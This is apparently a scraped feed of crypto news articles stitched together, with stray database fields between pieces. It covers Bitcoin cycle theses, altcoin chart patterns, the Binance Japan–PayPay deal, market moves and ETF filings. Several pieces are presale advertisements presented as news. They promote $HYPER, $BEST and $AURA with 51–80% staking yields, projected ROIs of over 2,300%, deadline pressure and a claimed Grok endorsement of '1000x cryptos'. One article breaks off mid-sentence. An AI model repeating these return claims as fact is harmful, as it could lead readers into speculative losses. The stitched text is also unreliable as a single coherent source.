RIP to the most reliable pattern in crypto, apparently. In his latest Substack post , dramatically titled Long Live the King , the former BitMEX boss argues that everything we thought we knew about Bitcoin’s cyclical behavior is about to be thrown out the window. The macroeconomic tea he’s spilling actually makes sense this time. When the Fed prints money like it’s going out of style and China joins the global liquidity party, Bitcoin thrives. With Trump literally screaming at Jerome Powell to slash interest rates faster, which he actually did in September 2025 , and China deciding to stop being the fun police on monetary expansion, we’re entering what Hayes calls an era where ‘money shall be cheaper and more plentiful.’ Traditional cycle watchers are expecting Bitcoin to hit its peak soon and then nosedive 70% to 80%, like it’s done for the past decade. But the institutional money that doesn’t panic sell during dips (because, well, institutions have actual risk-management strategies) can literally change this religious yearly ritual, just as Hayes says. Suppose Hayes is right. His track record, despite his self-deprecating humor about his predictions being pretty bad, is actually pretty solid. In that case, we’re looking at a structural shift in how Bitcoin behaves in response to monetary policy. This is precisely why the Bitcoin Hyper ($HYPER) presale momentum is absolutely exploding right now. Having recently hit $22.9M, $HYPER is positioning itself to ride the $BTC wave with a utility-first approach – a Bitcoin Layer-2 – that actually makes sense in this new liquidity-driven environment. Bitcoin Hyper’s presale is essentially offering a discounted entry point into this macro thesis before the mainstream catches on. Bitcoin Hyper: Where Solana Speed Meets $BTC Security When Hayes talks about Bitcoin benefiting from increased liquidity, he’s talking about infrastructure that can actually handle that liquidity without fees going parabolic or transactions taking 45 minutes. Bitcoin Hyper ($HYPER) is building exactly that infrastructure. So, what separates Bitcoin Hyper from the casino of shitcoins flooding your X feed? The project is building an actual Layer-2 (L2) solution that will bring Solana’s legendary speed to Bitcoin’s unmatched security. Bitcoin Hyper will integrate the Solana Virtual Machine as a Layer-2 on Bitcoin , connected via a Canonical Bridge, basically taking Bitcoin’s Fort Knox-level security and giving it a Ferrari engine. The Canonical Bridge will enable asset transfers between Bitcoin’s main chain and Bitcoin Hyper’s L2, meaning you get to keep Bitcoin’s battle-tested decentralization while executing transactions at Solana-level speeds. No more choosing between security and scalability, because Bitcoin Hyper will give you both, which is precisely what institutional money needs as it floods into crypto. So Hayes’ thesis is coming full circle. Developers will be able to deploy Solana-style dApps on Bitcoin’s ecosystem, tapping into Bitcoin’s liquidity while maintaining the transaction throughput that actually makes DeFi usable. The tokenomics are designed for sustainability; not a quick rug pull. The team has allocated significant portions to staking rewards and ecosystem development, which means they’re playing the long game, precisely the game you want to play if Hayes’ post-cycle thesis is correct. Arthur Hayes is not an infallible crypto oracle; the man himself admits his predictions have been hit or miss. But when a billionaire who’s been in Bitcoin since before it was cool starts talking about structural market changes backed by actual Fed policy and global liquidity data, maybe it’s worth paying attention. And when a presale like Bitcoin Hyper positions itself specifically to capitalize on this exact macro environment, with actual utility and legitimate staking yields, that’s strategic positioning. The four-year cycle might be dead, but opportunities like this are very much alive. And Bitcoin Hyper’s $22.9M+ presale is testament to that. Even whales are sitting up and taking notice, with hefty buys of $378.5K and $263K coming in, among many others. Right now you can buy $HYPER for just $0.013095 per token, and stake it for 51% APY. $HYPER price predictions , by the way, forecast a potential $0.253 by the end of 2030.

It has slipped slightly in the past 24 hours and is down about 5% over the past week. Consequently, traders are watching a chart pattern that may set up a larger move. If the price pulls back, $0.69 is being marked as a possible buy zone. Triangle Pattern Signals Potential Move Crypto analyst Ali Martinez shared a 12-hour chart showing ADA compressing inside a symmetrical triangle. The formation began in late 2024 and is approaching a point where a clear move is likely. Martinez pointed to $0.69 as a possible support level, also aligned with the 62% Fibonacci retracement zone.

The formation is indicative of a gradual rise in trading, and the construction is supporting the idea of further levels if the support is maintained. Key Levels in Focus as Price Compresses Jonathan Carter also posted a daily chart showing ADA forming higher lows and lower highs, creating a symmetrical triangle. He noted that the 50-day moving average (MA 50) is acting as resistance. The price is hovering just below this level, near $0.80. A break above could open room toward $0.96, $1.15, and $1.50. Carter highlighted consistency in price movements close to $0.76 as a confirmation that the trendline is still valid. His recommendation was to wait for a closing above the MA 50 before considering the possibility of upward movement. The RSI is still among the neutral levels, indicating there is space for both ways, based on momentum and volume.

They posted that unique wallets have fallen to about 1,000 from over 8,000 in late 2024. “Most heartbreaking Cardano chart of all,” they wrote, referring to a visible drop in network participation. In technical development, the team behind Cardano introduced the Hydra Node version 1.0.0. This upgrade signifies the transition from testing to complete readiness for the Layer-2 protocol.

Great news for Solana fans! The largest DEX aggregator on the network, Jupiter, is launching its own stablecoin called $JupUSD . By using its own stablecoin, Jupiter will require $SOL to be used for transaction fees, which creates a new source of demand for the token. With Jupiter already handling almost $20B in trading volume last month, you can see how much potential $JupUSD has. The move could bring billions of dollars into the Solana ecosystem, significantly boosting the $SOL price. It’s a major step toward making Solana a bigger player in the $304B stablecoin space. Many believe that the launch of this new stablecoin, along with factors such as potential US rate cuts and the prospect of a spot $SOL ETF , could be the perfect recipe for a major $SOL price surge. Some analysts are even predicting $SOL could break its all-time high of $300 and possibly climb even higher. This could be just the beginning of a huge quarter for Solana and its related tokens, especially since the network has a history of launching significant runs for meme coins. Talking of big runs for meme coins, you should check out Snorter Token ($SNORT) , the project that aims to help you succeed at Solana meme coin trading.

His forecast, grounded in technical analysis, historical trends, and mathematical modeling, has reignited strong bullish sentiment within the XRP community. EGRAG’s prediction centers around the ascending triangle pattern, a classic bullish formation in technical analysis. This pattern typically signals a breakout when prices consolidate between a rising trendline and a horizontal resistance level. Based on historical data, ascending triangles tend to break out around the 70–80% point of their formation, a range that currently aligns with late October for XRP. To put it into perspective, EGRAG notes that 80% of the triangle’s total formation period (362 days) equals 289 days, which lands precisely around October 28, 2025. Therefore, this mathematical projection, backed by XRP’s consistent compression within the triangle structure, supports the theory that a significant upward move could soon follow. Nevertheless, it remains to be seen whether this projection will see the light of day as XRP continues to hover around the $2.83 region per CoinGecko data . Binance Japan and PayPay Forge a Game-Changing Alliance to Bring Crypto to Millions In a landmark move for Japan’s digital economy, Binance Japan and PayPay have officially partnered, bridging crypto with everyday payments. This alliance connects the world’s leading crypto exchange to Japan’s top cashless platform, empowering over 70 million users and accelerating the nation’s Web3 adoption. Under the agreement, PayPay will acquire a 40% stake in Binance Japan, signaling deep confidence in the future of digital assets. This collaboration allows PayPay’s massive user base to directly buy, hold, and use cryptocurrencies through familiar payment channels, effectively turning crypto from a niche investment into a mainstream financial tool. PayPay has long been Japan’s leading digital wallet, dominating the nation’s cashless payment sector with its seamless QR-based system, loyalty rewards, and merchant network spanning millions of stores. By linking this infrastructure with Binance’s trading and blockchain technology, users will gain access to a simplified, secure, and regulated crypto ecosystem integrated into their daily transactions. This partnership is more than a financial collaboration, it’s a technological bridge between traditional finance and the decentralized future. It brings Japan closer to a Web3-enabled economy, where digital currencies can be used as naturally as yen for shopping, transport, entertainment, and more. For millions of Japanese users, the implications are transformative. Crypto will no longer be confined to trading platforms, it will live within the same app they use for groceries, transport, and bills. Conclusion EGRAG CRYPTO’s October forecast for XRP blends mathematical precision with historical breakout trends, signaling strong bullish potential ahead. As XRP nears the crucial 70–80% completion mark of its ascending triangle, traders are watching for alignment in price, volume, and sentiment to confirm the move. Should the pattern unfold as projected, October 28, 2025, could mark not just a breakout, but a defining turning point for XRP, potentially igniting a rally toward the long-anticipated $3.20 target. On the other hand, the partnership between Binance Japan and PayPay marks a pivotal milestone in digital finance. By merging Binance’s global crypto expertise with PayPay’s dominance in Japan’s cashless economy, the alliance goes beyond adoption, it integrates crypto into everyday life. This move could fast-track Japan’s shift toward a fully digital economy powered by blockchain innovation, transforming payments, savings, and commerce.",News|Ripple,EN,0,0,CRYPTOCURRENCY|ASIA|XRP|EXCHANGE|BNB,"{'name': 'Coinpaper', 'img': 'https://resources.cryptocompare.com/news/93/default.png', 'lang': 'EN'}",coinpaper,2025-10-10 10:04:57

Ethereum Founder Vitalik Buterin Held a Multi-Token Sale and Moved 70 ETH via Railgun Buterin sold 40.25 billion SPURDO, 10.31 billion MARVIN, and 6 trillion DOJO tokens for a total of 22.14 ETH (approximately $96,000). Following the sale, Buterin transferred his assets, worth 70 ETH (approximately $304,000), to a new wallet identified as being affiliated with the Ethereum Foundation. This transfer was made through a proprietary protocol called Railgun, which enhances user privacy. Railgun is known for its ability to encrypt transactions on the blockchain, hiding sender and recipient addresses. This development is seen as a continuation of Buterin's recent surge in on-chain activity. The renowned developer has previously attracted attention from the crypto community with various token sales and wallet movements. Analysts note that Buterin's moves do not have a direct impact on the market, but his activities on the Ethereum ecosystem are closely watched by investors.

Strategy’s $80B Bitcoin treasury now ranks #5 among all US corporate treasuries, surpassing giants like NVIDIA, Apple, and Meta.3️⃣After $BTC’s $126K ATH, a crypto analyst views a pullback to $108K–$118K as strong support before the crypto leader potentially breaks $150K this year.4️⃣ As $BTC’s demand possibly accelerates, the Bitcoin Hyper Layer 2 prepares to make the Bitcoin network faster, cheaper, and DeFi-friendly. Despite $BTC taking a downturn at ~$121K, not helped by a large-scale whale selling $363M+ worth of $BTC, it’s not all doom and gloom for the #1 crypto. Despite a short-term correction being plausible, momentum remains strong. And it’s all thanks to institutions still betting big on $BTC, contributing to its recent $126K ATH. Analysts still foresee a target of at least $150K by this year’s end. Suppose that plays out, Bitcoin Hyper ($HYPER) could be launching at the perfect moment. Anticipated to launch before 2026 kickstarts, the Bitcoin Hyper Layer-2 (L2) network will help the Bitcoin network scale seamlessly, regardless of heightened network activity. It’s no wonder, then, that its native token – $HYPER – is edging closer and closer to the $23M mark on presale. OG Whale Spooks Market With $419M $BTC Short Not helping $BTC’s current short-term stance is an ‘OG’ crypto whale recently making a significant bearish move. After selling $3K $BTC (worth $363.87M) earlier this week, the trader deposited $80M in $USDC into Hyperliquid to open a 6x leveraged short position at 3,477 $BTC (valued at $419M). The liquidation price is set at $140,660, so the position will automatically be closed if $BTC breaks that level. Also not helping matters, the big-time investor transferred an additional $50M $USDC to Binance, signaling plans for more trades or liquidity management. Such a large short bet suggests that the trader foresees $BTC’s price taking a nosedive in the near future, a stance that contrasts with bullish sentiment.Still, the bigger concern is whether these moves will shake investor confidence and spur more large investors to follow similar strategies. But there’s light at the end of the tunnel. Strategy Joins Top 5 US Treasuries With $80B $BTC Helping $BTC’s long-term strength, Strategy’s $80B Bitcoin treasury now ranks #5 among all US corporate treasuries . The company suggests it’s on track to ‘closing in on the #2 spot among all US corporate treasuries,’ suggesting it has high hopes for $BTC’s future trajectory. Considering that Strategy already surpasses some of the largest corporate treasuries (even NVIDIA, Apple, and Meta), such data also reflects how far $BTC has come as a serious corporate reserve asset. This is especially true when taking into account that $BTC broke its $126K ATH on October 6, 2025, up by over 99% year-to-date . And per crypto analysts, the crypto king is destined for even rosier pursuits. Analysts Predict $BTC Breaking $150K This Year Following $BTC breaking new ATHs, CrediBULL Crypto stated on X that the ‘ next leg to $150K has begun .’ Interestingly, they view a pullback to $108K–$118K as a strong support rather than a concern, noting that traders often buy back in at these levels. Crypto trader and miner Nick Hellmann also expects $BTC to retest support before surging to $150K and possibly reach $244K this cycle. If $BTC breaks these levels, Bitcoin Hyper ($HYPER) could be launching into one of the most bullish market environments in $BTC’s history. Its L2 solution could be precisely what it needs to boost scalability and adoption. Bitcoin Hyper to Scale Bitcoin Amid Peak Demand Bitcoin Hyper aims to solve some of the Bitcoin network’s most prominent challenges, starting with speed and scalability. Right now, Bitcoin can only facilitate 5.48 transactions per second (tps) , a significant 99.33% lower than Solana’s 825.9 tps. In fact, the network has only ever managed to facilitate 7 tps at max, whereas Solana has achieved a commendable 65K tps. Bitcoin Hyper aims to fix this. By leveraging the Solana Virtual Machine (SVM) , the L2 strives to bring Solana-level throughput to Bitcoin. In turn, the network should be able to achieve thousands of tps without steep costs. When a chain can only handle a limited number of tps, users compete to get theirs processed, which can significantly drive up fees. But by processing more transactions simultaneously, Hyper aims to reduce congestion and keep fees to a minimum. Given that the average $BTC fee is currently $1.258 , while Solana’s is just $0.0027, Bitcoin Hyper would help make the Bitcoin network much more practical for everyday use. What’s more, by utilizing a Canonical Bridge , $BTC will be able to move into the Hyper ecosystem seamlessly. In turn, you’ll be able to access new opportunities not previously available on Bitcoin – DeFi, dApps, NFT marketplaces, and even the best meme coins . The L2’s ultimate aim? To make Bitcoin more valuable and versatile than ever before. Join $HYPER for 51% Staking APY & Possible 2,367% ROI Buying $HYPER, however, is when the magic really happens. Its presale success, which has already raised a sizable $22.9M+, is directly tied to the L2’s growth. The reason is that a hefty 30% of the total token supply is set aside for ongoing development and network expansion. An additional 20% of $HYPER is earmarked for marketing, ensuring the L2 continues attracting strong visibility to attract new users. On top of boosting the L2’s evolution and popularity, $HYPER grants several benefits to token holders: lower gas fees, governance rights, and the ability to earn 51% APY via staking. Since the staking rate will gradually decrease as participation grows, now’s a prime time to buy and stake $HYPER at just $0.012975 per token. What’s more, the presale price is set to increase tomorrow and possibly hit $0.32 this year (as per our Bitcoin Hyper price prediction ). So, if you get involved today, you’ll be securing $HYPER at its current lowest rate. If our prediction goes as planned, you’ll also achieve an ROI of 2,367%. Join $HYPER before tomorrow’s price rise.

Futures on the S&P 500 and Nasdaq 100 ticked down slightly, while contracts tied to the Dow Jones Industrial Average added 22 points. This comes a day after the S&P 500 and Nasdaq Composite both closed in the red, easing off their all-time highs. The Dow was pacing for a 0.9% weekly drop, while the S&P 500 was still set to post a 0.3% gain and the Nasdaq looked on course for a 1.1% weekly advance, according to data from CNBC. The stalemate in Washington shows no signs of easing after the Senate failed for the seventh time to pass a stop-gap bill to reopen the government last night. Now, both the Republicans and the Democrats remain at odds, and negotiations appear frozen. Traders are still pricing in a 95% chance of a 25-basis-point rate cut by the Federal Reserve at its October meeting, but the odds for another cut in December have plunged to 80%, when it was at 90% last week. Bond yields plunge as global markets remain at stalemate Meanwhile, the 10-year US Treasury yield dropped more than 3 basis points to 4.11%, while the 2-year slipped over 1 basis point to 3.581%. The 30-year Treasury yield fell more than 4 basis points to 4.689%. Each basis point equals 0.01%, and yields move opposite to prices. The lack of government data during the shutdown only deepened the pressure on the bond market. In Europe, stocks opened mixed. The Stoxx 600 was flat 20 minutes into trade, with most sectors edging up. Thursday’s session had ended lower as investors weighed new deals and political uncertainty in France. Defense stocks dropped, with the Stoxx Europe Aerospace and Defense index down 0.7%. Traders also monitored news of a fragile peace deal in the Middle East that U.S. President Donald Trump helped broker. The impact of Beijing’s export measures added to volatility. China’s decision to impose fresh controls on rare earth minerals rattled markets, given their importance in defense equipment and consumer tech. Mining stocks took the hit, dragging the Stoxx Europe Basic Resources index down 1.2%. The move reversed earlier gains this week when the European Union announced higher tariffs on imported steel. Asian indexes, global currencies and commodities trade sideways Asia-Pacific trading was choppy. In Tokyo, the Nikkei 225 shed 1.01% to close at 48,088.8, while the Topix sank 1.85% to 3,197.59. In Seoul, the Kospi surged 1.73% to 3,610.6 after a holiday break, with the smaller Kosdaq adding 0.61% to 859.49. Australia’s ASX/S&P 200 slipped 0.13% to 8,958.3. In Hong Kong, the Hang Seng Index lost 1.84%, while mainland China’s CSI 300 fell 1.97% to 4,616.83.

The global shift to the ISO 20022 messaging standard by November 2025 is driving one of the most significant overhauls in modern banking history. As the pressure mounts, attention is turning toward real-time, blockchain-powered networks — and Ripple appears to be among the most technically aligned solutions. A Defining Moment for Global Banking SWIFT’s ISO 20022 migration marks a pivotal turning point for the financial industry. After November 22, 2025, legacy MT message formats will no longer coexist with ISO 20022, compelling banks to fully upgrade their payment and messaging systems. This shift isn’t just a technical formality; it demands deep changes in how payment data is structured, validated, and transmitted. For many institutions, the cost of retrofitting old systems is immense, prompting a search for faster and more efficient routes to compliance. BANKS WILL TURN TO RIPPLE AS THE FASTEST AND MOST EFFICIENT ROUTE TO ISO 20022 READINESS BY NOVEMBER 2025 The November 2025 ISO 20022 deadline is forcing banks to upgrade their messaging and processing engines. This makes real time payment rail adoption the most cost… pic.twitter.com/zsQ28pAnLZ — SMQKE (@SMQKEDQG) October 9, 2025 Real-Time Payment Rails: The Shortcut to Compliance To meet ISO 20022 requirements, banks need infrastructure that can handle enriched data and settle payments instantly. Real-time payment rails provide a practical bridge, reducing reconciliation errors, improving transparency, and lowering liquidity costs. Instead of re-engineering legacy technology, financial institutions are exploring “ready-made” networks that already operate within the framework ISO 20022 promotes: instant, data-rich, and globally interoperable. Ripple’s Advantage Ripple’s network is purpose-built for the modern payments era. Its architecture allows interbank, account-to-account transfers to be initiated, processed, and confirmed within seconds — a capability that traditional systems cannot easily replicate. Unlike legacy payment networks that rely on correspondent banking, Ripple uses what Temenos, a leading banking software provider, describes as “crypto rails.” These rails enable currencies to move “cheaply, rapidly, and smoothly as information on the internet.” Ripple’s protocol, designed as a distributed payment network, automatically routes transactions through the lowest-cost exchange path — optimizing speed and reducing conversion friction across borders. This combination of instant settlement, 24/7 uptime, and liquidity efficiency directly aligns with the goals of ISO 20022 modernization. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 What Researcher SMQKE Argues According to researcher SMQKE, banks will inevitably turn to Ripple as “the fastest and most efficient route to ISO 20022 readiness by November 2025.” The reasoning is straightforward: as the deadline approaches, the operational and financial burden of legacy upgrades will drive institutions toward networks that already meet the new standard’s performance and data requirements. Ripple, with its mature infrastructure and proven interoperability, offers a near plug-and-play compliance pathway. A Realistic Path Forward While SMQKE’s position captures a clear market trend, mass adoption will ultimately depend on regulatory clarity, successful bank-led pilots, and the willingness of established financial institutions to integrate blockchain-based settlement mechanisms. Nonetheless, Ripple’s technology stack and real-time payment capabilities make it an increasingly attractive candidate for ISO 20022-aligned modernization strategies. Final Outlook The countdown to November 2025 is well underway, and the banking world is racing to adapt. Whether through direct integration or partnership models, Ripple’s framework offers a compelling alternative to traditional rails — one that delivers compliance, cost efficiency, and speed in equal measure. As SMQKE notes, banks seeking the most efficient migration path may soon discover that the road to ISO 20022 readiness runs straight through Ripple’s network — where the future of cross-border payments is already being built, one transaction at a time.

52938449,https://cryptonews.com/?p=436146,1760094320,https://resources.cryptocompare.com/news/52/52938449.jpeg,"Bitcoin ‘Ice Cold’ at Record Highs, Indicator Signals Room to Run to $180K",https://cryptonews.com/news/bitcoin-ice-cold-at-record-highs-indicator-signals-room-to-run-to-180k/,"Bitcoin may be sitting at record highs, but a key long-term price gauge suggests the world’s largest cryptocurrency still has plenty of room to climb. Key Takeaways: The Mayer Multiple shows Bitcoin remains far from “overbought,” suggesting room for further upside toward $180,000. Current readings of 1.16 indicate a cooler, more sustainable bull market compared to past cycles that peaked above 2.4. Analysts view Bitcoin’s muted indicator levels as a sign of strong long-term momentum, despite short-term volatility. According to the Mayer Multiple, a popular onchain indicator tracking the ratio of Bitcoin’s price to its 200-week moving average, BTC remains far from “overheated.” The latest readings place the Multiple at just 1.16, well below the 2.4 level that has historically signaled market tops. Analyst Says Bitcoin Still Has Room to Run “Bitcoin is at all-time highs and the Mayer Multiple is ice cold,” said crypto quant analyst Frank A . Fetter on X this week, referencing data from analytics site Checkonchain. Fetter noted that for the indicator to flash “overbought” conditions, Bitcoin would need to rise to around $180,000, implying significant upside potential. The Mayer Multiple has long served as a temperature check for Bitcoin’s broader market cycles. During previous peaks, such as in 2017 and 2021, the indicator soared well above 2.4, reflecting speculative fervor and signaling overheated conditions. Bitcoin is at all-time highs and the Mayer Multiple is ice cold. I like the setup. $BTC pic.twitter.com/I5pNkydV2l — Frank (@FrankAFetter) October 9, 2025 This cycle, however, has been markedly cooler. The Multiple’s highest reading so far was 1.84 in March 2024, when Bitcoin traded near $72,000, according to data from Glassnode. Analysts suggest this muted reading reflects a healthier and more sustained bull market. In July, crypto researcher Axel Adler Jr. described readings near 1.1 as “a good fuel reserve for a new upward impulse,” echoing the idea that Bitcoin’s price still has headroom before reaching historically frothy territory. Despite the bullish outlook from onchain data, traders remain divided on timing. Some analysts warn that if Bitcoin fails to break out decisively before year-end, the broader bull cycle could lose momentum. Others expect continued volatility through October, traditionally one of Bitcoin’s strongest months, with potential retracements to $114,000 before any move higher. Even so, with the Mayer Multiple signaling plenty of “fuel in the tank,” many see Bitcoin’s long-term trajectory still pointing north, potentially toward the $180,000 mark. Analyst Warns Bitcoin Faces Decisive 100-Day Window Bitcoin may be nearing a critical turning point, according to trader Tony “The Bull” Severino, who believes the next 100 days could determine whether the cryptocurrency enters a parabolic rally or ends its current bull cycle. Severino pointed to the Bollinger Bands indicator on Bitcoin’s weekly chart, which has tightened to levels unseen before, often a precursor to sharp price moves in either direction. Severino cautioned that “head fakes,” or false breakouts, are common during such setups. He noted Bitcoin recently failed to break above the upper band with strength after briefly touching $126,000, suggesting a potential dip before any sustained rally. Currently, BTC trades around $122,700, hovering below its record highs as volatility compresses further. While some analysts fear a looming breakdown, others argue that Bitcoin’s cycles are getting longer, hinting at more room for growth.

October is ETF month. As many as 16 crypto ETF applications have their deadlines set in October, with the SEC expected to further its pro-crypto stance and potentially approve several of them. These ETFs cover a wide variety of major altcoins such as Solana, XRP, Litecoin, and Dogecoin. It’s also worth noting that the number of crypto ETF applications filed with the SEC has been rising rapidly. A whopping 31 new crypto ETFs were filed in just the last two months. This clearly indicates that institutions want to pounce on the reduced regulatory friction and growing optimism within the crypto market. We asked Grok why crypto ETFs are so bullish for the market. Here’s what it said: Even though the process has become easier, investing directly in crypto still requires a certain level of technical know-how. Crypto ETFs make crypto investing accessible, not only to crypto-savvy users but also to traditional investors familiar with stock markets. They allow diversification, bring in institutional inflows, and open the doors for a much larger investor base. Ultimately, this influx of capital fuels long-term growth in the entire crypto ecosystem. It’s worth recalling that back in June, Bloomberg ETF analyst James Seyffart assigned a 90% or higher probability of the SEC approving multiple crypto ETFs in 2025. Those odds have only increased since, especially after the SEC recently approved new generic listing standards for spot crypto and altcoin ETFs . Under this new framework, ETFs can now be directly listed on major exchanges like the Nasdaq, CBOE, and NYSE without waiting for individual sign-offs – a major procedural win for the industry. All in all, with major blue-chip cryptos already trading in the green this month and a wave of ETF approvals potentially around the corner, this could be the best time to stack your portfolio with moonshot opportunities. Here are Grok’s top three picks for the best crypto to buy now . 1. Bitcoin Hyper ($HYPER) – New L2 Using SVM to Bring Solana’s Performance to Bitcoin Missing those golden days when Bitcoin used to rally 100% in a month and make crypto millionaires left, right, and center? While Bitcoin’s maturity might make that seemingly impossible right now, there are still enough Bitcoin-led opportunities if you pay attention. And Bitcoin Hyper ($HYPER) is easily the best altcoin to buy right now in that regard. This new Layer-2 solution aims to crank up Bitcoin’s real-world utility by bringing Solana-like performance to the network. Currently, transactions on Bitcoin can take a lifetime, demand higher fees, and users on the network have no access to the Web3 and DeFi spaces that have become staples in the crypto world today. By integrating the Solana Virtual Machine , however, Hyper’s new Layer-2 will be capable of executing thousands of transactions simultaneously, as long as they’re not related to each other. Furthermore, it will also enable developers to build smart contracts and decentralized applications on Bitcoin, unlocking access to a never-before-seen Web3 environment on the network. This includes high-speed DeFi trading apps, DAOs, governance, lending, staking, swapping, gaming dApps, and more. All you will need to do as an end-user of Bitcoin Hyper is send your Layer-1 $BTC tokens to the project’s non-custodial canonical bridge, which will then lock your tokens and mint an equivalent number of Layer-2 tokens for you to use. Take a look at our step-by-step guide on how to buy Bitcoin Hyper at its current price of $0.013095. Here’s the kicker… $HYPER has the potential to go bonkers soon after its listing. According to our $HYPER price prediction , a $100 investment today could turn into $2.4K before the end of 2025. Grab your $HYPER tokens today – and take advantage of its 51% staking APY. 2. Best Wallet Token ($BEST) – Powering a Secure & User-Friendly Crypto Wallet The crypto wallet market is growing at a whopping 26.3% CAGR and is predicted to hit $100B by 2033 . If you want a piece of this growth, you need to buy Best Wallet Token ($BEST) , aka the native cryptocurrency of Best Wallet . Best Wallet is a free-to-download crypto wallet designed to keep your funds safe while also empowering you to buy and sell tokens, identify the best crypto presales , and even stake your tokens in one of the most seamless ways possible. For starters, since it’s non-custodial, it doesn’t hand out your private keys to anyone else but you. On top of that, you can use your biometrics to secure login access, and you’ll be protected by cutting-edge safeguards against honeypots, rug pulls, and crypto scams. A real standout feature of Best Wallet, however, is its Upcoming Tokens section. As the name suggests, this section showcases the best new cryptocurrency projects , allowing you not only to identify them before they go mainstream but also to buy them directly from within the Best Wallet app. It’s worth noting that this functionality isn’t being offered by any other crypto wallet right now. Essentially, it saves you the hassle of visiting external presale websites, wondering whether they’re safe or scams, connecting your wallet, and spending unnecessary time and energy securing your tokens. With Best Wallet, the entire process is seamless. Plus, its project team verifies every token listed in this section, so you don’t have to worry about losing your funds. Holding $BEST also unlocks a slew of exclusive benefits, including: Reduced trading and gas fees Voting rights on key platform decisions Early access to new crypto projects Staking rewards currently yielding 80% Since it’s in presale, 1 $BEST is currently available for just $0.025765. Take a look at our step-by-step guide to buying $BEST if you’re thinking of investing. And to whet your appetite, here’s something else to consider: according to our $BEST price prediction , it could hit $0.62 by the end of 2026 – that’s an eye-popping 2,300% ROI. Buy $BEST today to fully capitalize on the future of crypto wallets. 3. Aura ($AURA) – Meme Coin Based on a Viral Internet Phenomenon You know what would happen if Bitcoin were to soar 20% tomorrow. Investors would be rich, sure. Crypto would become even more dominant – also true. Most importantly, though, Bitcoin would gain ‘Aura’ points. Enter Aura ($AURA) . To the uninitiated, Aura can simply be defined as the charm a person carries. More specifically, how that charm increases or decreases after a certain action. For example, if a high school football player were to score a 90th-minute goal with a swollen left leg, he’d gain infinite Aura points among his peers. That may sound crazy. Yet it’s exactly why the $AURA token, based on this wildly popular Aura trend, has become one of the top-trending cryptos of recent times. It’s up over 2,200% since its launch in June 2024 and is currently undergoing a much-needed consolidation before potentially exploding higher. Ride one of the biggest internet sensations – buy $AURA tokens on MEXC and other leading platforms. Recap : With the SEC expected to greenlight several crypto ETFs this ‘Uptober,’ Grok recommends stacking your portfolio with the next 1000x cryptos – like Bitcoin Hyper ($HYPER) , Best Wallet Token ($BEST) , and Aura ($AURA). Disclaimer: Crypto investments are highly risky. Kind do your own research before investing. None of the above is financial advice.

Following a late Thursday drop from $123,000 to $120,000, BTC has recovered to trade around $121,400, with privacy coins such as Zcash (ZEC) and dash (DASH) rising sharply. The CoinDesk 20 Index has bounced to 4,178 points from the overnight low of 4,097. BTC's volatility has picked up, likely in expectation of another Fed rate cut later this month. ""Bitcoin volatility is poised for a breakout. Implied volatilities across 14, 30, and 90-day expiries have surged to their highest levels in the past 30 days, pointing to increased anticipation of big moves ahead,"" Nick Forster, founder of decentralized exchange Derive, said. Forster added that the so-called vol spike comes as markets price in a near-certain 25 basis point rate cut by the Federal Reserve later this month. Polymarket bettors price in a 91% chance that the Fed will reduce rates by 25 basis points at the Oct. 28-29 meeting, even as the ongoing government shutdown has delayed key data releases. The central bank cut rates to 25 bps to 4% last month. In other news, State Street's 2025 Digital Assets Outlook showed that nearly 60% of institutional investors are planning to boost their digital asset exposure in the coming year, with the average exposure expected to double within three years. Several U.S. Democratic senators reportedly made a counter proposal to the market structure bill, involving a ""restricted list"" for DeFi protocols deemed too risky. Crypto lawyer Jake Chervinsk said it could derail regulatory progress while undermining the bipartisan support for the Clarity Act seen in the House in July. Meanwhile, Chainlink launched a Chainlink-grade RPC endpoint for the HyperEVM testnet, providing builders in the @HyperliquidX ecosystem with infrastructure for developers working on innovative solutions like HIP-3, vaults, liquid staking tokens (LSTs), and spot deployment. In traditional markets, the dollar index continues to hover at two-month highs, as China tightened its grip on rare earth exports, ratcheting up trends ahead of an expected Xi-Trump meeting in South Korea later this month.

Day 2 of 2: North American Blockchain Summit (Dallas) Token Talk By Oliver Knight The recent Chinese memecoin frenzy which sent tokens like GIGGLE, 四, and 哈基米 on PancakeSwap V2 soaring, has abruptly fizzled out. Within 24 hours, many of these assets lost more than 95% of their value, wiping out speculative gains built on hype and social momentum. The crash coincided with a broader memecoin market downturn that Binance founder Changpeng “CZ” Zhao described as a “blood bath,” fueled by FUD and false rumors about token listings. The plunge comes after Binance rolled out its ""Meme Rush"" platform that was supposed to provide a structured path for tokens before being tradable on various decentralized and centralized exchanges. However, much like how Solana memecoins faded in February following the launch of TRUMP and MELANIA, BNB Chain memes appear to be following the same route to demise. Pancake Swap trading volume has remained inflated at $18 bilion over the past 24 hours, with a handful of newly-launched tokens catching a bid, although it's worth noting that liquidity remains relatively low; with w Derivatives Positioning Data from Coinglass shows that many BTC perpetual short positions face the risk of liquidation above $121,600. So, a sustained move above the said level could trigger a short squeeze, leading to a quick rally toward record highs. The market is undergoing a leverage reset, with volatility flushing out excess positioning on both sides, Glassnode said. Still, the overall positioning in the global BTC futures market remains elevated, with open interest just shy of the record 755K BTC. BNB, XRP, ADA, and TRX have seen a drop in futures open interest (OI) in the past 24 hours, indicating capital outflows. BTC's OI has risen by 1%, with ETH up just 0.4%. The XMR market is looking a bit overheated, with annualized funding rates nearing 60%, a sign of frenzied demand for bullish bets. Funding rates for other major tokens, including BTC and ETH, paint a bullish picture, but nothing out of the ordinary. On decentralized exchange Derive, open interest in the Oct. 31 expiry options is concentrated in calls at strikes $128K and $145K, reflecting a bullish bias. ETH options activity is equally bullish, with OI concentrated in $5K and $6K calls. On Deribit, however, the call-put skew for BTC and ETH remains mildly negative across timeframes, reflecting a bias for protective puts. Block flows on Paradigm featured ETH puts and straddles.

